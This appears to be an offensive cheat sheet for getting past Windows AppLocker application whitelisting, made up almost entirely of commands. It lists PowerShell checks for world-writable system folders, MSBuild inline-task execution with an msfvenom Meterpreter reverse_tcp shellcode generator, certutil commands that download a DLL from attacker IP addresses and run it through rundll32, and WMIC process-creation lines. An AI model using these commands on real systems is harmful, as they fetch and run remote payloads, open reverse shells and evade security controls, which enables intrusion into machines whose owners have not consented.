### AppLockerPolicy
```
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
Get-ChildItem 'C:\Windows\temp*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
Get-ChildItem 'C:\Windows\tasks*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}
Get-ChildItem 'C:\Windows\tracing*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} 
```


### MSBuildShell
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\Scripts\MSBuildShell.csproj
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe C:\Scripts\MSBuildShell.csproj

msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f csharp
https://github.com/3gstudent/msbuild-inline-task/blob/master/executes%20shellcode.xml
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe file.csproj
C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe file.xml
```
### RunDll32
```
certutil -urlcache -split -f http://192.168.147.129:9090/cmd.dll "C:\\Users\\Public\\cmd.dll" & rundll32 shell32.dll,Control_RunDLL C:\Users\Public\cmd.dll
certutil -urlcache -split -f http://192.168.200.128:9090/cmd.dll "C:\\Users\\Public\\cmd123.dll"&rundll32 shell32.dll,Control_RunDLL C:\Users\Public\cmd123.dll
certutil -urlcache -split -f http://192.168.147.129:9090/cmd.dll "C:\\Users\\Public\\cmd.dll" 
certutil -urlcache -split -f http://192.168.147.129:9090/cmd.dll "C:\\Windows\\Tasks\\cmd.dll"
certutil -urlcache -split -f http://192.168.147.129:9090/cmd.dll "C:\\Windows\\Temp\\cmd.dll"
certutil -urlcache -split -f http://192.168.147.129:9090/cmd.dll C:\\Windows\\tracing\\cmd.dll

rundll32 C:\cmd.dll,EntryPoint
rundll32 shell32.dll,Control_RunDLL C:\cmd.dll
rundll32 shell32.dll,Control_RunDLL C:\Users\Public\cmd.dll
rundll32.exe \\192.168.1.107\ZtmW\test.dll,0
Wmic /node:"ComputerName" process call create "cmd.exe
process call create C:\windows\Windows\System32\cmd.exe
rundll32.exe \\192.168.200.128:9090/cmd.dll,0
```
```
\\127.0.0.1\C$
\\127.0.0.1\D$
C:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
process call create C:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe #wmic
process call create C:\windows\Windows\System32\cmd.exe
```
